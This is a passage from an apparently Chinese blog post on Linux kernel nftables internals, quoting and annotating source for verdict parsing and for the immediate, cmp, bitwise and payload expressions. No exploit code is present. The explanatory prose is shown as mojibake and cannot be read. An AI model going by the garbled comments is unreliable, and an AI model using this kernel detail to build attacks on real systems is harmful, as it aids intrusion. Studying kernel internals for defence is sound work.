class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_verdict_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx, <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> nft_data_desc *desc, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla)</span><br>&#123;<br>u8 genmask = nft_genmask_next(ctx-&gt;net);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">tb</span>[<span class="hljs-title">NFTA_VERDICT_MAX</span> + 1];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span>;</span><br><span class="hljs-type">int</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. è§£ænlaä¸­çš„dataï¼Œå¹¶å°†å„ä¸ªéƒ¨åˆ†æŒ‡é’ˆæ”¾è¿›æŒ‡é’ˆæ•°ç»„tb</span><br><span class="hljs-comment">     */</span><br>err = nla_parse_nested_deprecated(tb, NFTA_VERDICT_MAX, nla,<br>  nft_verdict_policy, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. verdict.codeçš„èµ‹å€¼</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (!tb[NFTA_VERDICT_CODE])<br><span class="hljs-keyword">return</span> -EINVAL;<br>data-&gt;verdict.code = ntohl(nla_get_be32(tb[NFTA_VERDICT_CODE]));<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. æ ¹æ®é“¾åæˆ–idæŸ¥æ‰¾chainå¹¶èµ‹å€¼ç»™verdict.chain</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (data-&gt;verdict.code) &#123;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">switch</span> (data-&gt;verdict.code &amp; NF_VERDICT_MASK) &#123;<br><span class="hljs-keyword">case</span> NF_ACCEPT:<br><span class="hljs-keyword">case</span> NF_DROP:<br><span class="hljs-keyword">case</span> NF_QUEUE:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>fallthrough;<br><span class="hljs-keyword">case</span> NFT_CONTINUE:<br><span class="hljs-keyword">case</span> NFT_BREAK:<br><span class="hljs-keyword">case</span> NFT_RETURN:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_JUMP:<br><span class="hljs-keyword">case</span> NFT_GOTO:<br><span class="hljs-keyword">if</span> (tb[NFTA_VERDICT_CHAIN]) &#123;<br>chain = nft_chain_lookup(ctx-&gt;net, ctx-&gt;table,<br> tb[NFTA_VERDICT_CHAIN],<br> genmask);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tb[NFTA_VERDICT_CHAIN_ID]) &#123;<br>chain = nft_chain_lookup_byid(ctx-&gt;net,<br>      tb[NFTA_VERDICT_CHAIN_ID]);<br><span class="hljs-keyword">if</span> (IS_ERR(chain))<br><span class="hljs-keyword">return</span> PTR_ERR(chain);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (IS_ERR(chain))<br><span class="hljs-keyword">return</span> PTR_ERR(chain);<br><span class="hljs-keyword">if</span> (nft_is_base_chain(chain))<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><br>chain-&gt;use++;<br>data-&gt;verdict.chain = chain;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>desc-&gt;len = <span class="hljs-keyword">sizeof</span>(data-&gt;verdict);<br>desc-&gt;type = NFT_DATA_VERDICT;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nft-immediate-expr"><a href="#nft-immediate-expr" class="headerlink" title="nft_immediate_expr"></a>nft_immediate_expr</h4><ul><li><p><strong>ç»“æ„</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_immediate_expr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">data</span>;</span><br>u8dreg;<br>u8dlen;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>dataï¼šè¦å†™å…¥çš„å¸¸é‡</li><li>dregï¼šç›®æ ‡å¯„å­˜å™¨index</li><li>dlenï¼šè¦å†™å…¥çš„å¸¸é‡çš„é•¿åº¦ï¼Œ&lt;16</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_immediate_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr * <span class="hljs-type">const</span> tb[])</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_immediate_expr</span> *<span class="hljs-title">priv</span> =</span> nft_expr_priv(expr);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data_desc</span> <span class="hljs-title">desc</span>;</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (tb[NFTA_IMMEDIATE_DREG] == <span class="hljs-literal">NULL</span> ||<br>    tb[NFTA_IMMEDIATE_DATA] == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. è¦å†™å…¥çš„dataåˆå§‹åŒ–ï¼Œsizeé™åˆ¶lenåœ¨nft_dataç»“æ„ä½“èŒƒå›´å†…</span><br><span class="hljs-comment">     */</span><br>err = nft_data_init(ctx, &amp;priv-&gt;data, <span class="hljs-keyword">sizeof</span>(priv-&gt;data), &amp;desc,<br>    tb[NFTA_IMMEDIATE_DATA]);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>priv-&gt;dlen = desc.len;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. ç›®çš„å¯„å­˜å™¨indexè§£æ</span><br><span class="hljs-comment">     */</span><br>err = nft_parse_register_store(ctx, tb[NFTA_IMMEDIATE_DREG],<br>       &amp;priv-&gt;dreg, &amp;priv-&gt;data, desc.type,<br>       desc.len);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err1;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. å¦‚æœç›®çš„å¯„å­˜å™¨æ˜¯verdictï¼Œä¸”ä¸ºè·³è½¬åˆ™éœ€è¦åˆ¤å®šç›®æ ‡é“¾</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (priv-&gt;dreg == NFT_REG_VERDICT) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span> =</span> priv-&gt;data.verdict.chain;<br><br><span class="hljs-keyword">switch</span> (priv-&gt;data.verdict.code) &#123;<br><span class="hljs-keyword">case</span> NFT_JUMP:<br><span class="hljs-keyword">case</span> NFT_GOTO:<br><span class="hljs-keyword">if</span> (nft_chain_is_bound(chain)) &#123;<br>err = -EBUSY;<br><span class="hljs-keyword">goto</span> err1;<br>&#125;<br>chain-&gt;bound = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err1:<br>nft_data_release(&amp;priv-&gt;data, desc.type);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>ç”¨é€”</strong> å¾€å¯„å­˜å™¨ä¸­å†™å…¥æœ€å¤š16bytesçš„å¸¸é‡</p><p>å°±æ˜¯åˆ©ç”¨ <strong>nft_data_copy</strong> å‡½æ•°ä¹‹é—´è¿›è¡Œæ•°æ®å¤åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">nft_immediate_eval</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> nft_regs *regs,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_pktinfo *pkt)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_immediate_expr</span> *<span class="hljs-title">priv</span> =</span> nft_expr_priv(expr);<br><br>nft_data_copy(&amp;regs-&gt;data[priv-&gt;dreg], &amp;priv-&gt;data, priv-&gt;dlen);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nft-cmp-expr"><a href="#nft-cmp-expr" class="headerlink" title="nft_cmp_expr"></a>nft_cmp_expr</h4><ul><li><p><strong>ç»“æ„</strong></p><p>è¿™ä¸ªç»“æ„æœ‰selectå‡½æ•°</p><ul><li>32å­—èŠ‚ä»¥ä¸‹ &amp;&amp; æ˜¯å¦ç›¸ç­‰çš„æ¯”è¾ƒä½¿ç”¨ <strong>nft_cmp_fast_ops</strong></li><li>å¦åˆ™ä½¿ç”¨ <strong>nft_cmp_ops</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_cmp_expr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">data</span>;</span><br>u8sreg;<br>u8len;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_cmp_ops</span><span class="hljs-title">op</span>:</span><span class="hljs-number">8</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>dataï¼šå¸¸é‡ï¼Œè°ƒç”¨nft_data_initåˆå§‹åŒ–</li><li>sregï¼šæºå¯„å­˜å™¨indexï¼Œè°ƒç”¨nft_parse_register_loadè·å–</li><li>lenï¼šå¸¸é‡é•¿åº¦ï¼Œ&lt;16</li><li>opï¼šå“ªç§åˆ¤æ–­ï¼Œå¤§äºï¼Ÿå°äºï¼Ÿâ€¦</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_cmp_fast_expr</span> &#123;</span><br>u32data;<br>u32mask;<br>u8sreg;<br>u8len;<br><span class="hljs-type">bool</span>inv;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>dataï¼šå¸¸é‡ï¼Œè°ƒç”¨nft_data_initåˆå§‹åŒ–</li><li>maskï¼šæ©ç </li><li>sregï¼šæºå¯„å­˜å™¨indexï¼Œè°ƒç”¨nft_parse_register_loadè·å–</li><li>lenï¼šå¸¸é‡é•¿åº¦ï¼Œé™åˆ¶åœ¨nft_dataç»“æ„ä½“èŒƒå›´å†…</li><li>invï¼šç›¸ç­‰ or ä¸ç›¸ç­‰</li></ul></li><li><p><strong>ç”¨é€”</strong> å°†å¯„å­˜å™¨å€¼å’Œå¸¸é‡è¿›è¡Œæ¯”è¾ƒ</p><p>è®¡ç®—æ—¶</p><ul><li><strong>nft_cmp_eval</strong> å°±æ˜¯ä½¿ç”¨memcmpå¹¶å¯¹ç»“æœè¿›è¡Œåˆ¤æ–­ï¼Œmatchåˆ™breakï¼Œå¦åˆ™continue</li><li><strong>nft_cmp_fast_eval</strong> ç›´æ¥ä½¿ç”¨ç­‰å·åˆ¤æ–­ï¼Œå†åˆ¤æ–­å’Œinvæ˜¯å¦match</li></ul></li></ul><h4 id="nft-bitwise-expr"><a href="#nft-bitwise-expr" class="headerlink" title="nft_bitwise_expr"></a>nft_bitwise_expr</h4><ul><li><p><strong>ç»“æ„</strong></p><p>æœ‰selectå‡½æ•°</p><ul><li>32ä½data &amp;&amp; ä½æ“ä½œä¸ºå¼‚æˆ–åˆ™ä½¿ç”¨ <strong>nft_bitwise_fast_ops</strong></li><li>å¦åˆ™ä½¿ç”¨ <strong>nft_bitwise_ops</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_bitwise</span> &#123;</span><br>u8sreg;<br>u8dreg;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_bitwise_ops</span><span class="hljs-title">op</span>:</span><span class="hljs-number">8</span>;<br>u8len;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">mask</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">xor</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">data</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>sregï¼šæºå¯„å­˜å™¨indexï¼Œnft_parse_register_loadè·å–</li><li>dregï¼šç›®çš„å¯„å­˜å™¨indexï¼Œnft_parse_register_storeè·å–</li><li>opï¼šå¼‚æˆ–ï¼Œå·¦ç§»æˆ–å³ç§»</li><li>lenï¼šæ“ä½œæ•°æ®é•¿åº¦ï¼Œxor &lt;16ï¼Œshift &lt;0xff</li><li>maskï¼šæ©ç <ul><li>mask.len &#x3D;&#x3D; len</li><li>type &#x3D;&#x3D; NFT_DATA_VALUE</li><li>nft_data_initè·å–ï¼Œnft_dataç»“æ„ä½“èŒƒå›´å†…</li></ul></li><li>xorï¼šåŒä¸ŠğŸ‘†</li><li>dataï¼šä½ç§»ä½æ•°<ul><li>typeä¸ºNFT_DATA_VALUE</li><li>32ä½</li><li>&lt;32</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_bitwise_fast_expr</span> &#123;</span><br>u32mask;<br>u32xor;<br>u8sreg;<br>u8dreg;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>maskï¼šæºç </li><li>xorï¼šå¼‚æˆ–æ•°</li><li>sregï¼šæºå¯„å­˜å™¨index</li><li>dregï¼šç›®çš„å¯„å­˜å™¨index</li></ul></li><li><p><strong>ç”¨é€”</strong> ä½æ“ä½œï¼Œå¼‚æˆ–ï¼Œå·¦ç§»æˆ–å³ç§»</p><p>è®¡ç®—æ—¶</p><ul><li><strong>nft_bitwise_eval</strong><ul><li>boolï¼šå››å­—èŠ‚ä¸ºå•ä½å¼‚æˆ–dataå’Œxor</li><li>lshiftï¼šdata[0]è¡¨ç¤ºä½ç§»ä½æ•°</li><li>rshiftï¼šåŒä¸ŠğŸ‘†</li></ul></li><li><strong>nft_bitwise_fast_eval</strong> ç›´æ¥å¼‚æˆ–</li></ul></li></ul><h4 id="nft-payload-expr"><a href="#nft-payload-expr" class="headerlink" title="nft_payload_expr"></a>nft_payload_expr</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span> &#123;</span><br>NFT_PAYLOAD_LL_HEADER,<span class="hljs-comment">// è¿æ¥å±‚headerï¼Œå¦‚ethernet</span><br>NFT_PAYLOAD_NETWORK_HEADER, <span class="hljs-comment">// ç½‘ç»œå±‚headerï¼Œå¦‚IPv4æˆ–IPv6</span><br>NFT_PAYLOAD_TRANSPORT_HEADER, <span class="hljs-comment">// ä¼ è¾“å±‚headerï¼Œå¦‚UDPæˆ–TCP</span><br>NFT_PAYLOAD_INNER_HEADER, <span class="hljs-comment">// é‡Œå±‚headeræˆ–è€…payload</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><strong>ç»“æ„</strong></p><p>æœ‰selectå‡½æ•°</p><ul><li><p>å†™packetä½¿ç”¨ <strong>nft_payload_set_ops</strong></p></li><li><p>è¯»packet</p><ul><li>è¯»ç½‘ç»œå±‚æˆ–è€…ä¼ è¾“å±‚</li><li>len &lt;&#x3D; 4</li><li>lenä¸º2çš„æ¬¡æ–¹</li><li>offsetåŸºäºlenå¯¹é½</li></ul><p>ä½¿ç”¨ <strong>nft_payload_fast_ops</strong></p><p>å¦åˆ™ä½¿ç”¨ <strong>nft_payload_ops</strong></p></li></ul><p>è¯»å†™æŒ‰æ˜¯å¦æœ‰æº &#x2F; ç›®çš„å¯„å­˜å™¨åˆ¤æ–­</p><ul><li><p><strong>nft_payload_set</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload_set</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span><span class="hljs-title">base</span>:</span><span class="hljs-number">8</span>;<br>u8offset;<br>u8len;<br>u8sreg;<br>u8csum_type;<br>u8csum_offset;<br>u8csum_flags;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>baseï¼šè¦æ”¹çš„headerç±»å‹ï¼Œè§ <strong>nft_payload_bases</strong> ğŸ‘†</p></li><li><p>offsetï¼šè¦æ”¹çš„çš„offset</p></li><li><p>lenï¼šè¦æ”¹çš„é•¿åº¦ï¼Œæ— é™åˆ¶</p></li><li><p>sregï¼šdataæºå¯„å­˜å™¨</p></li><li><p>csum_typeï¼šchecksumç±»å‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_csum_types</span> &#123;</span><br>NFT_PAYLOAD_CSUM_NONE,<span class="hljs-comment">// æ²¡æœ‰checksum</span><br>NFT_PAYLOAD_CSUM_INET,<span class="hljs-comment">// IPåè®®checksum</span><br>NFT_PAYLOAD_CSUM_SCTP,  <span class="hljs-comment">// CRC-32cï¼ŒSCTPä¸­ä½¿ç”¨</span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>csum_offsetï¼šchecksumåœ¨headerä¸­çš„åç§»</p></li><li><p>csum_flagsï¼šchecksumçš„flagsï¼Œåªæœ‰ä¸€ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_csum_flags</span> &#123;</span><br>NFT_PAYLOAD_L4CSUM_PSEUDOHDR = (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>),<br>&#125;;<br></code></pre></td></tr></table></figure><p>æœ‰å…¶ä»–å€¼æŠ¥é”™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (flags &amp; ~NFT_PAYLOAD_L4CSUM_PSEUDOHDR)<br><span class="hljs-keyword">return</span> -EINVAL;<br></code></pre></td></tr></table></figure><p>è¡¨ç¤ºä½¿ç”¨ä¼ªé¦–éƒ¨è®¡ç®—TCP checksumï¼ˆå››çº§æ ¡éªŒï¼‰</p></li></ul></li><li><p><strong>nft_payload</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span><span class="hljs-title">base</span>:</span><span class="hljs-number">8</span>;<br>u8offset;<br>u8len;<br>u8dreg;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>baseï¼šè¦è¯»çš„headerç±»å‹</li><li>offsetï¼šè¦è¯»çš„åç§»</li><li>lenï¼šè¦è¯»çš„é•¿åº¦ï¼Œæ— é™åˆ¶</li><li>dregï¼šç›®çš„å¯„å­˜å™¨</li></ul></li></ul></li><li><p><strong>ç”¨é€”</strong> è¯»å†™packetçš„header</p><ul><li><p><strong>nft_payload_set_eval</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_payload_set_eval</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> nft_regs *regs,</span><br><span class="hljs-params"> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_pktinfo *pkt)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload_set</span> *<span class="hljs-title">priv</span> =</span> nft_expr_priv(expr);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *<span class="hljs-title">skb</span> =</span> pkt-&gt;skb;<br><span class="hljs-type">const</span> u32 *src = &amp;regs-&gt;data[priv-&gt;sreg];<br><span class="hljs-type">int</span> offset, csum_offset;<br>__wsum fsum, tsum;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. è·å–headerçš„offset</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (priv-&gt;base) &#123;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_LL_HEADER:<br><span class="hljs-keyword">if</span> (!skb_mac_header_was_set(skb))<br><span class="hljs-keyword">goto</span> err;<br>offset = skb_mac_header(skb) - skb-&gt;data;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_NETWORK_HEADER:<br>offset = skb_network_offset(skb);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_TRANSPORT_HEADER:<br><span class="hljs-keyword">if</span> (!(pkt-&gt;flags &amp; NFT_PKTINFO_L4PROTO) || pkt-&gt;fragoff)<br><span class="hljs-keyword">goto</span> err;<br>offset = nft_thoff(pkt);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_INNER_HEADER:<br>offset = nft_payload_inner_offset(pkt);<br><span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>WARN_ON_ONCE(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. è·å–checksumçš„offsetå’Œè¦æ›´æ”¹çš„offset</span><br><span class="hljs-comment">     */</span><br>csum_offset = offset + priv-&gt;csum_offset;<br>offset += priv-&gt;offset;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. è®¡ç®—æ›´æ–°checksum</span><br><span class="hljs-comment">     *    * è¿è¾“å±‚å››çº§æ ¡éªŒæˆ–è€…IPæ ¡éªŒ</span><br><span class="hljs-comment">     *    * è¦æ›´æ”¹ç½‘ç»œå±‚æˆ–è€…æ•°æ®é“¾è·¯å±‚headerï¼Œæˆ–è€…è¿˜æœªè¿›è¡Œæ ¡éªŒ</span><br><span class="hljs-comment">     *    ä»¥ä¸Šæƒ…å†µéœ€è¦æ›´æ–°checksum</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> ((priv-&gt;csum_type == NFT_PAYLOAD_CSUM_INET || priv-&gt;csum_flags) &amp;&amp;<br>    ((priv-&gt;base != NFT_PAYLOAD_TRANSPORT_HEADER &amp;&amp;<br>      priv-&gt;base != NFT_PAYLOAD_INNER_HEADER) ||<br>     